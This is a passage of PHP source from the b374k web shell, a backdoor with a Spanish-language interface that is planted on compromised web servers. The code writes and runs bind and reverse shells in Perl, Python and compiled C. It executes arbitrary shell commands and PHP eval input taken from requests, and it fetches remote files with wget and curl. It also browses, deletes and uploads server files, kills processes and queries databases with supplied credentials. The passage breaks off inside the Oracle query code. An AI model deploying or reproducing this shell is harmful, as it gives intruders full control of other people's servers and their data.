				$res = exe("chmod +x ".$fpath);
				$res = exe("perl ".$fpath." ".$target);
			}
			else $result = $errperm;
		}
		else $result = $errperm;
	}
	elseif($type == "xbind_py"){
		$fname = "b374k_bind.py";
		$fpath = $d.$fname;
		if(is_file($fpath)) unlink($fpath);
		if($file=fopen($fpath,"w")){
			fwrite($file,$fc);
			fclose($file);
			if(is_file($fpath)){
				$res = exe("chmod +x ".$fpath);
				$res = exe("python ".$fpath." ".$target);
			}
			else $result = $errperm;
		}
		else $result = $errperm;

	}
	elseif($type == "xbind_bin"){
		$fname = "b374k_bind";
		$fpath = $d.$fname;

		if(!$s_win){
			if(is_file($fpath)) unlink($fpath);
			if(is_file($fpath.".c")) unlink($fpath.".c");
			if($file=fopen($fpath.".c","w")){
				fwrite($file,$fc);
				fclose($file);
				if(is_file($fpath.".c")){
					$res = exe("gcc ".$fpath.".c -o ".$fpath);
					if(is_file($fpath)){
						$res = exe("chmod +x ".$fpath);
						$res = exe($fpath." ".$target);
					}
					else $result = $errgcc;
				}
				else $result = $errperm;

			}
			else $result = $errperm;
		}
		else{
			$fpath = $fpath . ".exe";
			if(is_file($fpath)) unlink($fpath);
			if($file=fopen($fpath,"w")){
				fwrite($file,$fc);
				fclose($file);
				if(is_file($fpath)){
					$res = exe("\"".$fpath."\" ".$target);
				}
				else $result = $errperm;
			}
			else $result = $errperm;
		}

	}
	elseif($type == "xback_pl"){
		$fname = "b374k_back.pl";
		$fpath = $d.$fname;
		$tar = explode(" ",$target,2);
		if(is_file($fpath)) unlink($fpath);
		if($file=fopen($fpath,"w")){
			fwrite($file,$fc);
			fclose($file);
			if(is_file($fpath)){
				$res = exe("chmod +x ".$fpath);
				$res = exe("perl ".$fpath." ".$target);
			}
			else $result = $errperm;
		}
		else $result = $errperm;
	}
	elseif($type == "xback_py"){
		$fname = "b374k_back.py";
		$fpath = $d.$fname;
		$tar = explode(" ",$target,2);
		if(is_file($fpath)) unlink($fpath);
		if($file=fopen($fpath,"w")){
			fwrite($file,$fc);
			fclose($file);
			if(is_file($fpath)){
				$res = exe("chmod +x ".$fpath);
				$res = exe("python ".$fpath." ".$target);
			}
			else $result = $errperm;
		}
		else $result = $errperm;

	}
	elseif($type == "xback_bin"){
		$fname = "b374k_back";
		$fpath = $d.$fname;
		$tar = explode(" ",$target,2);

		if(!$s_win){
			if(is_file($fpath)) unlink($fpath);
			if(is_file($fpath.".c")) unlink($fpath.".c");
			if($file=fopen($fpath.".c","w")){
				fwrite($file,$fc);
				fclose($file);
				if(is_file($fpath.".c")){
					$res = exe("gcc ".$fpath.".c -o ".$fpath);
					if(is_file($fpath)){
						$res = exe("chmod +x ".$fpath);
						$res = exe($fpath." ".$target);
					}
					else $result = $errgcc;
				}
				else $result = $errperm;
			}
			else $result = $errperm;
		}
		else{
			$fpath = $fpath . ".exe";
			if(is_file($fpath)) unlink($fpath);
			if($file=fopen($fpath,"w")){
				fwrite($file,$fc);
				fclose($file);
				if(is_file($fpath)){
					$res = exe($fpath." ".$target);
				}
				else $result = $errperm;
			}
			else $result = $errperm;
		}
	}

	return $result;
}
// get file size
function gs($f){
	if($s = filesize($f)){
		if($s <= 1024) return $s;
		else{
			if($s <= 1024*1024) {
				$s = round($s / 1024,2);;
				return $s." kb";
			}
			else {
				$s = round($s / 1024 / 1024,2);
				return $s." mb";
			}
		}
	}
	else return "???";
}
// get file permissions
function gp($f){
	if($m=fileperms($f)){
		$p='';
		$p .= ($m & 00400) ? 'r' : '-';
		$p .= ($m & 00200) ? 'w' : '-';
		$p .= ($m & 00100) ? 'x' : '-';
		$p .= ($m & 00040) ? 'r' : '-';
		$p .= ($m & 00020) ? 'w' : '-';
		$p .= ($m & 00010) ? 'x' : '-';
		$p .= ($m & 00004) ? 'r' : '-';
		$p .= ($m & 00002) ? 'w' : '-';
		$p .= ($m & 00001) ? 'x' : '-';
		return $p;
	}
	else return "??????????";
}
// shell command
function exe($c){
	if(function_exists('system')) {
		ob_start();
		system($c);
		$b = ob_get_contents();
		ob_end_clean();
		return $b;
	}
	elseif(function_exists('shell_exec')){
		$b = shell_exec($c);
		return $b;
	}
	elseif(function_exists('exec')) {
		exec($c,$r);
		$b = "";
		foreach($r as $s){
			$b .= $s;
		}
		return $b;
	}
	elseif(function_exists('passthru')) {
		ob_start();
		passthru($c);
		$b = ob_get_contents();
		ob_end_clean();
		return $b;
	}
	return ""; // failed... oh my
}
// add slash to the end of given path
function cp($p){
	if(is_dir($p)){
		$x = DIRECTORY_SEPARATOR;
		while(substr($p,-1) == $x) $p = rtrim($p,$x);
		return $p.$x;
	}
	return $p;
}
// delete dir and all of its content (no warning !) xp
function rmdirs($d) {
	$f = glob($d . '*', GLOB_MARK);
	foreach($f as $z){
		if(is_dir($z)) rmdirs($z);
		else unlink($z);
	}
	if(is_dir($d)) rmdir($d);
}
function xwhich($pr){
	$p = exe("which $pr");
	if(trim($p)!="") { return trim($p); } else { return trim($pr); }
}
// download file from internet
function dlfile($u,$p){
	$n = basename($u);

	// try using php functions
	if($t = file_get_contents($u)){
		if(is_file($p)) unlink($p);;
		if($f=fopen($p,"w")){
			fwrite($f,$t);
			fclose($f);
			if(is_file($p)) return true;
		}
	}

	// using wget
	exe(xwhich('wget')." ".$u." -O ".$p);
	if(is_file($p)) return true;

	// try using lwp-download
	exe(xwhich('lwp-download')." ".$u." ".$p);
	if(is_file($p)) return true;

	// try using lynx
	exe(xwhich('lynx')." -source ".$u." > ".$p);
	if(is_file($p)) return true;

	// try using curl
	exe(xwhich('curl')." ".$u." -o ".$p);
	if(is_file($p)) return true;

	return false;
}
// explorer, return a table of given dir
function showdir($pwd,$prompt,$win){
	if(function_exists("posix_getpwuid") && function_exists("posix_getgrgid")) $posix = TRUE;
	else $posix = FALSE;

	$user = "????:????";
	$fname = array();
	$dname = array();

	if($dh = scandir($pwd)){
		foreach($dh as $file){
			if(is_dir($file)) $dname[] = $file;
			elseif(is_file($file)) $fname[] = $file;
		}
	}
	else{
		if($dh = opendir($pwd)){
			while($file = readdir($dh)){
				if(is_dir($file)) $dname[] = $file;
				elseif(is_file($file))$fname[] = $file;
			}
			closedir($dh);
		}
	}

	sort($fname);
	sort($dname);

	$path = explode(DIRECTORY_SEPARATOR,$pwd);
	$tree = sizeof($path);
	$parent = "";
	$buff = "
<table class=\"explore sortable\">
	<tr><th>Nombre</th><th style=\"width:60px;\">Tama&#241;o</th><th style=\"width:100px;\">Propietario : Grupo</th><th style=\"width:70px;\">Permisos</th><th style=\"width:110px;\">Modificado</th><th style=\"width:210px;\">Acciones</th></tr>
	";
	if($tree > 2) for($i=0;$i<$tree-2;$i++) $parent .= $path[$i].DIRECTORY_SEPARATOR;
	else $parent = $pwd;

	foreach($dname as $folder){
		if($folder == ".") {
			if(!$win && $posix){
				$name = posix_getpwuid(fileowner($folder));
				$group = posix_getgrgid(filegroup($folder));
				$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];
			}
			else {
				$owner = $user;
			}
			$buff .= "<tr><td><a href=\"?d=".$pwd."\">[ $folder ]</a></td><td>LINK</td><td style=\"text-align:center;\">".$owner."</td><td  style=\"text-align:center;\">".gp($pwd)."</td><td style=\"text-align:center;\">".date("d-M-Y H:i",filemtime($pwd))."</td><td><span id=\"titik1\"><a href=\"?d=$pwd&amp;edit=".$pwd."archivo_nuevo.php\">Nuevo archivo</a> | <a href=\"javascript:tukar('titik1','titik1_form');\">Nueva Carpeta</a> | <a href=\"?upload&amp;d=$pwd\">Cargar</a></span>
			<form action=\"?\" method=\"get\" id=\"titik1_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
			<input type=\"hidden\" name=\"d\" value=\"".$pwd."\" />
			<input class=\"inputz\" style=\"width:140px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" />
			<input class=\"inputzbut\" type=\"submit\" name=\"rename\" style=\"width:35px;\" value=\"Ir !\" />
			</form></td></tr>
			";
		}
		elseif($folder == "..") {
			if(!$win && $posix){
				$name = posix_getpwuid(fileowner($folder));
				$group = posix_getgrgid(filegroup($folder));
				$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];
			}
			else {
				$owner = $user;
			}
			$buff .= "<tr><td><a href=\"?d=".$parent."\">[ $folder ]</a></td><td>LINK</td><td style=\"text-align:center;\">".$owner."</td><td style=\"text-align:center;\">".gp($parent)."</td><td style=\"text-align:center;\">".date("d-M-Y H:i",filemtime($parent))."</td><td><span id=\"titik2\"><a href=\"?d=$pwd&amp;edit=".$parent."archivo_nuevo.php\">Nuevo archivo</a> | <a href=\"javascript:tukar('titik2','titik2_form');\">Nueva Carpeta</a> | <a href=\"?upload&amp;d=$parent\">Cargar</a></span>
			<form action=\"?\" method=\"get\" id=\"titik2_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
			<input type=\"hidden\" name=\"d\" value=\"".$pwd."\" />
			<input class=\"inputz\" style=\"width:140px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" />
			<input class=\"inputzbut\" type=\"submit\" name=\"rename\" style=\"width:35px;\" value=\"Ir !\" />
			</form>
			</td></tr>";
		}
		else {
			if(!$win && $posix){
				$name = posix_getpwuid(fileowner($folder));
				$group = posix_getgrgid(filegroup($folder));
				$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];
			}
			else {
				$owner = $user;
			}
			$buff .= "<tr><td><a id=\"".cs($folder)."_link\" href=\"?d=".$pwd.$folder.DIRECTORY_SEPARATOR."\">[ $folder ]</a>
			<form action=\"?\" method=\"post\" id=\"".cs($folder)."_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
			<input type=\"hidden\" name=\"oldname\" value=\"".$folder."\" style=\"margin:0;padding:0;\" />
			<input type=\"hidden\" name=\"d\" value=\"".$pwd."\" />
			<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"".$folder."\" />
			<input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" />
			<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('".cs($folder)."_form','".cs($folder)."_link');\" />
			</form>
			<td>DIR</td><td style=\"text-align:center;\">".$owner."</td><td style=\"text-align:center;\">".gp($pwd.$folder)."</td><td style=\"text-align:center;\">".date("d-M-Y H:i",filemtime($folder))."</td><td><a href=\"javascript:tukar('".cs($folder)."_link','".cs($folder)."_form');\">renombrar</a> | <a href=\"?d=".$pwd."&amp;rmdir=".$pwd.$folder."\">Borrar</a> | <a href=\"?upload&amp;d=".$pwd.$folder."\">upload</a></td></tr>";
		}
	}

	foreach($fname as $file){
		$full = $pwd.$file;
		if(!$win && $posix){
			$name = posix_getpwuid(fileowner($folder));
			$group = posix_getgrgid(filegroup($folder));
			$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];
		}
		else {
			$owner = $user;
		}
		$buff .= "<tr><td><a id=\"".cs($file)."_link\" href=\"?d=$pwd&amp;view=$full\">$file</a>
		<form action=\"?\" method=\"post\" id=\"".cs($file)."_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
		<input type=\"hidden\" name=\"oldname\" value=\"".$file."\" style=\"margin:0;padding:0;\" />
		<input type=\"hidden\" name=\"d\" value=\"".$pwd."\" />
		<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"".$file."\" />
		<input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" />
		<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('".cs($file)."_link','".cs($file)."_form');\" />
		</form>
		</td><td>".gs($full)."</td><td style=\"text-align:center;\">".$owner."</td><td style=\"text-align:center;\">".gp($full)."</td><td style=\"text-align:center;\">".date("d-M-Y H:i",filemtime($full))."</td>
		<td><a href=\"?d=$pwd&amp;edit=$full\">Editar</a> | <a href=\"javascript:tukar('".cs($file)."_link','".cs($file)."_form');\">renombrar</a> | <a href=\"?d=$pwd&amp;delete=$full\">Borrar</a> | <a href=\"?d=$pwd&amp;dl=$full\">Bajar</a>&nbsp;(<a href=\"?d=$pwd&amp;dlgzip=$full\">gzip</a>)</td></tr>";
	}
	$buff .= "</table>";
	return $buff;
}

// favicon
if(isset($_REQUEST['favicon'])){
	$data = gzinflate(base64_decode($favicon));
	header("Content-type: image/png");
	header("Cache-control: public");
	echo $data;
	exit;
}
if($s_auth){
	// server software
	$s_software = getenv("SERVER_SOFTWARE");
	// check safemode
	if (ini_get("safe_mode") or strtolower(ini_get("safe_mode")) == "on")  $s_safemode = TRUE; else $s_safemode = FALSE;
	// uname -a
	$s_system = php_uname();
	// check os
	$s_win = FALSE;
	if(strtolower(substr($s_system,0,3)) == "win") $s_win = TRUE;
	// get path and all drives available
	$letters = '';
	if(!$s_win){
		if(!$s_user = rp(exe("whoami"))) $s_user = "";
		if(!$s_id = rp(exe("id"))) $s_id = "";
		$pwd = getcwd().DIRECTORY_SEPARATOR;
	}
	else {
		$s_user = get_current_user();
		$s_id = $s_user;
		$pwd = realpath(".")."\\";
		// find drive letters
	 	$v = explode("\\",$d);
		$v = $v[0];
		foreach (range("A","Z") as $letter){
			$bool = @is_dir($letter.":\\");
			if ($bool){
				$letters .= "<a href=\"?d=".$letter.":\\\">[ ";
				if ($letter.":" != $v) {$letters .= $letter;}
				else {$letters .= "<span class=\"gaya\">".$letter."</span>";}
				$letters .= " ]</a> ";
			}
		}
	}
	// prompt style..
	$s_prompt = $s_user." &gt;";

	// check for posix
	if(function_exists("posix_getpwuid") && function_exists("posix_getgrgid")) $s_posix = TRUE;
	else $s_posix = FALSE;

	// IP del servidor
	$s_server_ip = gethostbyname($_SERVER["HTTP_HOST"]);
	// your ip ;-)
	$s_my_ip = $_SERVER['REMOTE_ADDR'];

	// change working directory
	if(isset($_REQUEST['d'])){
		$d = ss($_REQUEST['d']);
		if(is_dir($d)){
			chdir($d);
			$pwd = cp($d);
		}
	}
	else $pwd = cp(getcwd());
	// sorttable.js
	if(isset($_REQUEST['sorttable'])){
		$data = gzinflate(base64_decode($sortable_js));
		header("Content-type: text/plain");
		header("Cache-control: public");
		echo $data;
		exit;
	}
	// download file specified by ?dl=<file>
	if(isset($_REQUEST['dl']) && ($_REQUEST['dl'] != "")){
		$f = ss($_REQUEST['dl']);
		$fc = file_get_contents($f);
		header("Content-type: application/octet-stream");
		header("Content-length: ".strlen($fc));
		header("Content-disposition: attachment; filename=\"".basename($f)."\";");
		echo $fc;
		exit;
	} // download file specified by ?dlgzip=<file> as gzip
	elseif(isset($_REQUEST['dlgzip']) && ($_REQUEST['dlgzip'] != "")){
		$f = ss($_REQUEST['dlgzip']);
		$fc = gzencode(file_get_contents($f));
		header("Content-Type:application/x-gzip\n");
		header("Content-length: ".strlen($fc));
		header("Content-disposition: attachment; filename=\"".basename($f).".gz\";");
		echo $fc;
		exit;
	}
	// kill process specified by pid
	if(isset($_REQUEST['pid'])){
		$p = ss($_REQUEST['pid']);
		if(function_exists("posix_kill")) posix_kill($p,'9');
		else{
			exe("kill -9 ".$p);
			exe("taskkill /F /PID ".$p);
		}
	}
	// view image specified by ?img=<file>
	if(isset($_REQUEST['img'])){
		ob_clean();
		$d = ss($_REQUEST['d']);
		$f = ss($_REQUEST['img']);
		$inf = getimagesize($d.$f);
		$ext = explode($f,".");
		$ext = $ext[count($ext)-1];
	 	header("Content-type: ".$inf["mime"]);
	 	header("Cache-control: public");
		header("Expires: ".date("r",mktime(0,0,0,1,1,2030)));
		header("Cache-control: max-age=".(60*60*24*7));
	 	readfile($d.$f);
	 	exit;
	}
	// rename file or folder
	if(isset($_REQUEST['rename']) && isset($_REQUEST['oldname']) && isset($_REQUEST['newname'])){
		$old = ss($_REQUEST['oldname']);
		$new = ss($_REQUEST['newname']);
		rename($pwd.$old,$pwd.$new);
		$fnew = $pwd.$new;
	}
	// delete file
	if(isset($_REQUEST['delete']) && ($_REQUEST['delete'] != "")){
		$f = ss($_REQUEST['delete']);
		if(is_file($f)) unlink($f);
	} // delete dir
	elseif(isset($_REQUEST['rmdir']) && ($_REQUEST['rmdir'] != "")){
		$f = ss(rtrim(ss($_REQUEST['rmdir'],DIRECTORY_SEPARATOR)));
		if(is_dir($f)) rmdirs($f);
	} // create dir
	elseif(isset($_REQUEST['mkdir']) && ($_REQUEST['mkdir'] != "")){
		$f = ss($pwd.ss($_REQUEST['mkdir']));
		if(!is_dir($f)) mkdir($f);
	}
	// box result
	$s_result = "";
	// php eval() function
	if(isset($_REQUEST['eval'])){
		$c = "";
		if(isset($_REQUEST['evalcode'])){
			$c = ss($_REQUEST['evalcode']);
			ob_start();
			eval($c);
			$b = ob_get_contents();
			ob_end_clean();
			$c = $b;
		}
		$s_result .= "	<form action=\"?\" method=\"post\">
				<textarea id=\"evalcode\" name=\"evalcode\" class=\"evalcode\">".htmlspecialchars($code)."</textarea>
				<p><input type=\"submit\" name=\"evalcodesubmit\" class=\"inputzbut\" value=\"Ir !\" style=\"width:120px;height:30px;\" /></p>
	<input type=\"hidden\" name=\"eval\" value=\"\" />
	<input type=\"hidden\" name=\"d\" value=\"".$pwd."\" />
	</form>
				";
	} // upload !
	elseif(isset($_REQUEST['upload'])){
		$s_result = " ";
		$msg = "";
		if(isset($_REQUEST['uploadhd'])){
			$fn = $_FILES['filepath']['name'];
			if(is_uploaded_file($_FILES['filepath']['tmp_name'])){
				$p = cp(ss($_REQUEST['savefolder']));
				if(!is_dir($p)) $p = cp(dirname($p));
				if(isset($_REQUEST['savefilename']) && (trim($_REQUEST['savefilename'])!="")) $fn = ss($_REQUEST['savefilename']);
				$tm = $_FILES['filepath']['tmp_name'];
				$pi = cp($p).$fn;
				$st = move_uploaded_file($tm,$pi);
				if($st)	$msg = "<p class=\"rs_result\">file uploaded to <a href=\"?d=".$pwd."&amp;view=".$pi."\">".$pi."</a></p>";
				else $msg = "<p class=\"rs_result\">failed to upload ".$fn."</p>";
			}
			else $msg = "<p class=\"rs_result\">failed to upload ".$fn."</p>";
		}
		elseif(isset($_REQUEST['uploadurl'])){
			// function dlfile($url,$fpath){
			$p = cp(ss($_REQUEST['savefolderurl']));
			if(!is_dir($p)) $p = cp(dirname($p));
			$fu = ss($_REQUEST['fileurl']);
			$fn = basename($fu);
			if(isset($_REQUEST['savefilenameurl']) && (trim($_REQUEST['savefilenameurl'])!="")) $fn = ss($_REQUEST['savefilenameurl']);
			$fp = cp($p).$fn;
			$st = dlfile($fu,$fp);
			if($st) $msg = "<p class=\"rs_result\">file uploaded to <a href=\"?d=".$pwd."&amp;view=".$fp."\">".$fp."</a></p>";
			else $msg = "<p class=\"rs_result\">failed to upload ".$fn."</p>";
		}	

		$s_result .= $msg;
		$s_result .= "
		<form action=\"?upload\" method=\"post\" enctype=\"multipart/form-data\">
		<div class=\"mybox\"><h2>Upload from computer</h2>
		<table class=\"myboxtbl\">
		<tr><td style=\"width:100px;\">File</td><td><input type=\"file\" name=\"filepath\" class=\"inputzbut\" style=\"width:400px;margin:0;\" />
	</td></tr>
		<tr><td>Save to</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"savefolder\" value=\"".$pwd."\" /></td></tr>
		<tr><td>Filename (optional)</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"savefilename\" value=\"\" /></td></tr>
		<tr><td>&nbsp;</td><td>
		<input type=\"submit\" name=\"uploadhd\" class=\"inputzbut\" value=\"Upload !\" style=\"width:120px;height:30px;margin:10px 2px 0 2px;\" />
	</td></tr>

		<input type=\"hidden\" name=\"d\" value=\"".$pwd."\" />
		</table>
		</div>
		</form>

		<form action=\"?upload\" method=\"post\">
		<div class=\"mybox\"><h2>Upload from internet</h2>
		<table class=\"myboxtbl\">
		<tr><td style=\"width:100px;\">File URL</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"fileurl\" value=\"\" />
	</td></tr>
		<tr><td>Save to</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"savefolderurl\" value=\"".$pwd."\" /></td></tr>
		<tr><td>Filename (optional)</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"savefilenameurl\" value=\"\" /></td></tr>
		<tr><td>&nbsp;</td><td>
		<input type=\"submit\" name=\"uploadurl\" class=\"inputzbut\" value=\"Upload !\" style=\"width:120px;height:30px;margin:10px 2px 0 2px;\" />
	</td></tr>

		<input type=\"hidden\" name=\"d\" value=\"".$pwd."\" />
		</table>
		</div>
		</form>

		";
	} // show phpinfo()
	elseif(isset($_REQUEST['phpinfo'])){
		ob_start();
		eval("phpinfo();");
		$b = ob_get_contents();
		ob_end_clean();
		$a = strpos($b,"<body>")+6; // yeah baby,, your body is wonderland ;-)
		$z = strpos($b,"</body>");
		$s_result = "<div class=\"phpinfo\">".substr($b,$a,$z-$a)."</div>";
	} // working with database
	elseif(isset($_REQUEST['db'])){
		$sqlhost = $sqlhost1 = $sqlhost2 = $sqlhost3 = $sqlhost4 = 'localhost';
		$sqluser = $sqluser1 = $sqluser2 = $sqluser3 = $sqluser4 = $odbcuser = $odbcdsn = $pdodsn = $pdouser = '';
		$sqlport = $sqlport1 = $sqlport2 = $sqlport3 = $sqlport4 = '';
		$sqlpass = $sqlpass1 = $sqlpass2 = $sqlpass3 = $sqlpass4 = $odbcpass = $pdopass = '';

		if(isset($_REQUEST['mysqlcon'])&&isset($_REQUEST['sqlhost1'])) $sqlhost = $sqlhost1 = ss($_REQUEST['sqlhost1']);
		if(isset($_REQUEST['mssqlcon'])&&isset($_REQUEST['sqlhost2'])) $sqlhost = $sqlhost2 = ss($_REQUEST['sqlhost2']);
		if(isset($_REQUEST['pgsqlcon'])&&isset($_REQUEST['sqlhost3'])) $sqlhost = $sqlhost3 = ss($_REQUEST['sqlhost3']);
		if(isset($_REQUEST['oraclecon'])&&isset($_REQUEST['sqlhost4'])) $sqlhost = $sqlhost4 = ss($_REQUEST['sqlhost4']);
		if(isset($_REQUEST['odbccon'])&&isset($_REQUEST['odbcdsn'])) $odbcdsn = ss($_REQUEST['odbcdsn']);
		if(isset($_REQUEST['pdocon'])&&isset($_REQUEST['pdodsn'])) $pdodsn = ss($_REQUEST['pdodsn']);
		if(isset($_REQUEST['sqlhost'])) $sqlhost = ss($_REQUEST['sqlhost']);

		if(isset($_REQUEST['mysqlcon'])&&isset($_REQUEST['sqluser1'])) $sqluser = $sqluser1 = ss($_REQUEST['sqluser1']);
		if(isset($_REQUEST['mssqlcon'])&&isset($_REQUEST['sqluser2'])) $sqluser = $sqluser2 = ss($_REQUEST['sqluser2']);
		if(isset($_REQUEST['pgsqlcon'])&&isset($_REQUEST['sqluser3'])) $sqluser = $sqluser3 = ss($_REQUEST['sqluser3']);
		if(isset($_REQUEST['oraclecon'])&&isset($_REQUEST['sqluser4'])) $sqluser = $sqluser4 = ss($_REQUEST['sqluser4']);
		if(isset($_REQUEST['odbccon'])&&isset($_REQUEST['odbcuser'])) $odbcuser = ss($_REQUEST['odbcuser']);
		if(isset($_REQUEST['pdocon'])&&isset($_REQUEST['pdouser'])) $pdouser = ss($_REQUEST['pdouser']);
		if(isset($_REQUEST['sqluser'])) $sqluser = ss($_REQUEST['sqluser']);

		if(isset($_REQUEST['mysqlcon'])&&isset($_REQUEST['sqlport1'])) $sqlport = $sqlport1 = ss($_REQUEST['sqlport1']);
		if(isset($_REQUEST['mssqlcon'])&&isset($_REQUEST['sqlport2'])) $sqlport = $sqlport2 = ss($_REQUEST['sqlport2']);
		if(isset($_REQUEST['pgsqlcon'])&&isset($_REQUEST['sqlport3'])) $sqlport = $sqlport3 = ss($_REQUEST['sqlport3']);
		if(isset($_REQUEST['oraclecon'])&&isset($_REQUEST['sqlport4'])) $sqlport = $sqlport4 = ss($_REQUEST['sqlport4']);
		if(isset($_REQUEST['sqlport'])) $sqlport = ss($_REQUEST['sqlport']);

		if(isset($_REQUEST['mysqlcon'])&&isset($_REQUEST['sqlpass1'])) $sqlpass = $sqlpass1 = ss($_REQUEST['sqlpass1']);
		if(isset($_REQUEST['mssqlcon'])&&isset($_REQUEST['sqlpass2'])) $sqlpass = $sqlpass2 = ss($_REQUEST['sqlpass2']);
		if(isset($_REQUEST['pgsqlcon'])&&isset($_REQUEST['sqlpass3'])) $sqlpass = $sqlpass3 = ss($_REQUEST['sqlpass3']);
		if(isset($_REQUEST['oraclecon'])&&isset($_REQUEST['sqlpass4'])) $sqlpass = $sqlpass4 = ss($_REQUEST['sqlpass4']);
		if(isset($_REQUEST['odbccon'])&&isset($_REQUEST['odbcpass'])) $odbcpass = ss($_REQUEST['odbcpass']);
		if(isset($_REQUEST['pdocon'])&&isset($_REQUEST['pdopass'])) $pdopass = ss($_REQUEST['pdopass']);
		if(isset($_REQUEST['sqlpass'])&&isset($_REQUEST['sqlpass'])) $sqlpass = ss($_REQUEST['sqlpass']);

		$sqls = "";
		$q_result = "";
		$hostandport = $sqlhost;
		if(trim($sqlport)!="") $hostandport = $sqlhost.":".$sqlport;

		if(isset($_REQUEST['mysqlcon']) && ($con = mysql_connect($hostandport,$sqluser,$sqlpass))){
			if(isset($_REQUEST['sqlcode'])){
				$sqls = ss($_REQUEST['sqlcode']);
				$querys = explode(";",$sqls);

				foreach($querys as $query){
				  if(trim($query) != ""){
					$hasil = mysql_query($query);
					if($hasil){
						$q_result .= "<p style=\"padding:0;margin:20px 6px 0 6px;\">".$query.";&nbsp;&nbsp;&nbsp;
						<span class=\"gaya\">[</span> ok <span class=\"gaya\">]</span></p>
						<table class=\"explore\" style=\"width:99%;\"><tr>";
						for($i=0;$i<mysql_num_fields($hasil);$i++)
							$q_result .= "<th>".htmlspecialchars(mysql_field_name($hasil,$i))."</th>";
						$q_result .= "</tr>";
						while($rows=mysql_fetch_array($hasil)){
							$q_result .= "<tr>";
							for($j=0;$j<mysql_num_fields($hasil);$j++)
							{
								if($rows[$j] == "") $dataz = " ";
								else $dataz = $rows[$j];
								$q_result .= "<td>".htmlspecialchars($dataz)."</td>";
							}
							$q_result .= "</tr>";
						}
						$q_result .= "</table>";
					}
					else $q_result .= "<p style=\"padding:0;margin:20px 6px 0 6px;\">".$query.";&nbsp;&nbsp;&nbsp;
							<span class=\"gaya\">[</span> error <span class=\"gaya\">]</span></p>";
				  }
				}
			}
			else $sqls = "SHOW databases;";

			$s_result .= "	<form action=\"?db\" method=\"post\">
					<input type=\"hidden\" name=\"sqlhost\" value=\"".$sqlhost."\" />
					<input type=\"hidden\" name=\"sqluser\" value=\"".$sqluser."\" />
					<input type=\"hidden\" name=\"sqlport\" value=\"".$sqlport."\" />
					<input type=\"hidden\" name=\"sqlpass\" value=\"".$sqlpass."\" />
					<input type=\"hidden\" name=\"d\" value=\"".$pwd."\" />
					<textarea id=\"sqlcode\" name=\"sqlcode\" class=\"evalcode\" style=\"height:10em;\">".$sqls."</textarea>
					<p><input type=\"submit\" name=\"mysqlcon\" class=\"inputzbut\" value=\"Ir !\" style=\"width:120px;height:30px;\" />
					&nbsp;&nbsp;Separate multiple commands with a semicolon  <span class=\"gaya\">[</span> ; <span class=\"gaya\">]</span></p>
					</form>";
			$s_result .= "<div>".$q_result."</div>";
			if($con) mysql_close($con);
		}
		elseif(isset($_REQUEST['mssqlcon']) && ($con = mssql_connect($hostandport,$sqluser,$sqlpass))){
			if(isset($_REQUEST['sqlcode'])){
				$sqls = ss($_REQUEST['sqlcode']);
				$querys = explode(";",$sqls);

				foreach($querys as $query){
				  if(trim($query) != ""){
					$hasil = mssql_query($query);
					if($hasil){
						$q_result .= "<p style=\"padding:0;margin:20px 6px 0 6px;\">".$query.";&nbsp;&nbsp;&nbsp;
						<span class=\"gaya\">[</span> ok <span class=\"gaya\">]</span></p>
						<table class=\"explore\" style=\"width:99%;\"><tr>";
						for($i=0;$i<mssql_num_fields($hasil);$i++)
							$q_result .= "<th>".htmlspecialchars(mssql_field_name($hasil,$i))."</th>";
						$q_result .= "</tr>";
						while($rows=mssql_fetch_array($hasil)){
							$q_result .= "<tr>";
							for($j=0;$j<mssql_num_fields($hasil);$j++)
							{
								if($rows[$j] == "") $dataz = " ";
								else $dataz = $rows[$j];
								$q_result .= "<td>".htmlspecialchars($dataz)."</td>";
							}
							$q_result .= "</tr>";
						}
						$q_result .= "</table>";
					}
					else $q_result .= "<p style=\"padding:0;margin:20px 6px 0 6px;\">".$query.";&nbsp;&nbsp;&nbsp;
							<span class=\"gaya\">[</span> error <span class=\"gaya\">]</span></p>";
				  }
				}
			}
			else $sqls = "EXEC sp_databases;";

			$s_result .= "	<form action=\"?db\" method=\"post\">
					<input type=\"hidden\" name=\"sqlhost\" value=\"".$sqlhost."\" />
					<input type=\"hidden\" name=\"sqluser\" value=\"".$sqluser."\" />
					<input type=\"hidden\" name=\"sqlport\" value=\"".$sqlport."\" />
					<input type=\"hidden\" name=\"sqlpass\" value=\"".$sqlpass."\" />
					<input type=\"hidden\" name=\"d\" value=\"".$pwd."\" />
					<textarea id=\"sqlcode\" name=\"sqlcode\" class=\"evalcode\" style=\"height:10em;\">".$sqls."</textarea>
					<p><input type=\"submit\" name=\"mssqlcon\" class=\"inputzbut\" value=\"Ir !\" style=\"width:120px;height:30px;\" />
					&nbsp;&nbsp;Separate multiple commands with a semicolon  <span class=\"gaya\">[</span> ; <span class=\"gaya\">]</span></p>
					</form>";
			$s_result .= "<div>".$q_result."</div>";
			if($con) mssql_close($con);
		}
		elseif(isset($_REQUEST['oraclecon']) && ($con = oci_connect($sqluser,$sqlpass,$hostandport))){
			if(isset($_REQUEST['sqlcode'])){
				$sqls = ss($_REQUEST['sqlcode']);
				$querys = explode(";",$sqls);

				foreach($querys as $query){
				  if(trim($query) != ""){
					$st = oci_parse($con, $query);
					if(oci_execute($st)){
